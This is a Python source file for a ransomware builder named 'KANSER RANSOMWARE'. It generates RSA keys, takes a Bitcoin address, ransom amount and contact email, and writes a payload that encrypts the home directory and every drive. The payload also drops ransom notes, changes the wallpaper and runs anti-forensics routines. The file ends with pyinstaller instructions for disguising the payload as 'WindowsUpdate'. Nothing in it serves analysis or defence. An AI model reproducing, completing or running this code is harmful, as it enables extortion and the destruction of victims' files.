#!/usr/bin/env python3
"""KANSER RANSOMWARE v1.0 — CLI Builder (pure console)"""
import os, sys, json, random, string, time
from datetime import datetime

R, G, Y, B, W = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"

def clear():
    os.system("cls")

def ts():
    return datetime.now().strftime("%H:%M:%S")

sys.path.insert(0, os.path.dirname(__file__))
from crypter import generate_keys, CONFIG as CRYPT_CONF
from ransom_note import generate_txt, generate_html

def main():
    clear()
    print(f"{R}=== KANSER RANSOMWARE BUILDER CLI v1.0 ==={W}\n")

    print(f"{Y}[{ts()}] Generating RSA keypair...{W}")
    priv, pub = generate_keys()
    from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption, PublicFormat
    priv_pem = priv.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption()).decode()
    pub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode()
    print(f"{G}[{ts()}] Keys generated{W}\n")

    btc = input(f"{B}BTC Address: {W}").strip()
    amount = input(f"{B}Ransom Amount (USD): {W}").strip() or "500"
    email = input(f"{B}Contact Email: {W}").strip()
    ext = input(f"{B}File Extension [{Y}.KRSN{B}]: {W}").strip() or ".KRSN"
    threads = input(f"{B}Thread Count [8]: {W}").strip() or "8"
    uid = input(f"{B}Ransom ID (enter=auto): {W}").strip() or "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

    key_file = input(f"{B}Private key save path [{Y}private_key.pem{B}]: {W}").strip() or "private_key.pem"
    with open(key_file, "w") as f:
        f.write(priv_pem)
    print(f"{G}[{ts()}] Private key saved: {key_file}{W}")
    print(f"{R}[!] DO NOT LOSE THIS FILE! ONLY DECRYPTION KEY!{W}\n")

    CRYPT_CONF["extension"] = ext
    CRYPT_CONF["threads"] = int(threads)

    ransom_txt = generate_txt(btc, amount, email, uid)
    ransom_html = generate_html(btc, amount, email)

    print(f"{Y}[{ts()}] Building payload...{W}")
    base = os.path.dirname(__file__)
    with open(os.path.join(base, "crypter.py"), "r", encoding="utf-8") as f:
        crypter_src = f.read()
    with open(os.path.join(base, "ransom_note.py"), "r", encoding="utf-8") as f:
        note_src = f.read()

    def extract_func(src, name):
        lines = src.split("\n")
        for i, line in enumerate(lines):
            if f"def {name}(" in line:
                indent = len(line) - len(line.lstrip())
                end = i + 1
                while end < len(lines):
                    stripped = lines[end]
                    if stripped.strip() and not stripped.startswith(" " * indent) and not stripped.startswith("\t"):
                        if not stripped.startswith(" " * (indent)):
                            break
                    end += 1
                return "\n".join(lines[i:end])
        return ""

    payload = f'''#!/usr/bin/env python3
import os, sys, json, base64, threading, time, random, shutil, subprocess, ctypes
from pathlib import Path

RSA_PUBLIC_KEY_PEM = """{pub_pem}"""
CONFIG = {json.dumps(CRYPT_CONF, indent=2)}
RANSOM_TXT = """{ransom_txt}"""
RANSOM_HTML = """{ransom_html}"""
RANSOM_ID = "{uid}"

{extract_func(crypter_src, "encrypt_file")}
{extract_func(crypter_src, "anti_forensics")}
{extract_func(crypter_src, "anti_analysis")}
{extract_func(crypter_src, "is_target_ext")}
{extract_func(crypter_src, "is_excluded_dir")}
{extract_func(note_src, "deploy_notes")}
{extract_func(note_src, "set_wallpaper")}

if __name__ == "__main__":
    print("Analyzing system...")
    import webbrowser
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    pub_key = serialization.load_pem_public_key(RSA_PUBLIC_KEY_PEM.encode(), backend=default_backend())
    base_dirs = [os.path.expanduser("~")]
    for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        dp = drive + ":\\\\"
        if os.path.exists(dp):
            base_dirs.append(dp)
    encrypt_all(base_dirs, pub_key, CONFIG)
    deploy_notes(base_dirs, "{btc}", "{amount}", "{email}", RANSOM_ID)
    anti_forensics()
    print("Done.")
'''

    payload_path = os.path.join(os.path.dirname(__file__), "payload_built.py")
    with open(payload_path, "w", encoding="utf-8") as f:
        f.write(payload)
    print(f"{G}[{ts()}] payload_built.py created{W}\n")

    print(f"{B}=== BUILD INSTRUCTIONS ==={W}")
    print(f"  pip install pyinstaller cryptography")
    print(f"  pyinstaller --onefile --noconsole --name=WindowsUpdate {payload_path}")
    print(f"\n{R}  [!] KEEP {key_file} SAFE!{W}")
    print(f"{Y}[{ts()}] Done.{W}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[{ts()}] Cancelled{W}")
